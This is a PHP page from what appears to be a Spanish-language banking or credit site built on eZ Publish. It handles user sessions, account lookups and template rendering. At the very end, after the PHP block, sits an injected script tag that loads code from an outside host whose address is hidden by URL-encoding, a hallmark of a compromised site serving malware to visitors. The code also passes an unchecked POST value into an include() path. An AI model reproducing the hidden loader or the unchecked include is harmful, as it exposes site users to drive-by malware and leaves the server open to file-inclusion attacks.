<?php
/////////////////////////
//Creado por Nexions - HM
/////////////////////////

include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

include("eztransaccion/user/include/cred_func.inc");

session_start();

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
$wsdl = $ini->read_var( "site", "Cred_ISI" );
$debug_status = $ini->read_var( "site", "Cred_ISI_DEBUG" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

if ( $user )
{
	$session =& eZSession::globalSession();

	if ( !$session->fetch() )
	{
		$session->store();
	}

	$tr = new eZTransaccion( );

	if( !isset( $FrAccount ) ) {
		$FrAccount = "0";
	}

	$usr = $session->variable( "r_usr" );
	$qki = $session->variable( "r_qki" );
	$priv = $session->variable( "r_priv" );
	$cust_id = $session->variable( "r_cno" ); //Este es el nro de cliente

	$transaccion_buffer = "";

	if ( !isset( $Access ) )
		$Access = "FrAc";

	$redirect = $_POST['redirect'];

	$result = getAccounts( $usr, $cust_id, $redirect );
	if ( stristr( $result, 'ERROR' ) === FALSE ) // NO ERROR
	{
		$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
							 "eztransaccion/user/intl/", $Language, $redirect . ".php" );

		$t->setAllStrings();

		$t->set_file( array(
			$redirect . "_tpl" => $redirect . ".tpl"
			) );

		$t->set_var( "transaccion_buffer", "" );

		//Escritura del template
		$t->pparse( "output", $redirect . "_tpl" );

		$usr = strtolower($usr);

		// Guardar en sesion los datos para el wsdl.
		$_SESSION['wsdl'] = $wsdl;
		$_SESSION['debug_status'] = $debug_status;

		if( strstr( $result, "SIN_CLIENTES_AGRUPADOS" ) === FALSE )
		{
			echo $result;
		}
		else
		{
			// cliente sin agrupados. Redirect
			$_POST['custNo'] = $cust_id;
			$_POST['userId'] = $usr;

			if($Access == "FrAc")
			{
				echo cleanSession( $redirect );

				if ( $redirect === "res_linea" )
					echo cleanSession( "saldoscre" );

				include("eztransaccion/user/include/" . $redirect . "_main_form.inc");
			}
		}
	}
	else
	{
		$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
							 "eztransaccion/user/intl/", $Language, "cred_err.php" );

		$t->setAllStrings();

		$t->set_file( array(
			"cred_err_tpl" => "cred_err.tpl"
			) );

		$t->set_var( "transaccion_buffer", "" );

		//Escritura del template
		$t->pparse( "output", "cred_err_tpl" );
		echo $result;
		echo "<strong>La operaci&oacute;n no pudo ser realizada. Por favor, intente nuevamente m&aacute;s tarde.</strong>";
	}

}//Fin if
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/saldoscre/" );

    $t->pparse( "output", "user_login_tpl" );
}//Fin else
?>

<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>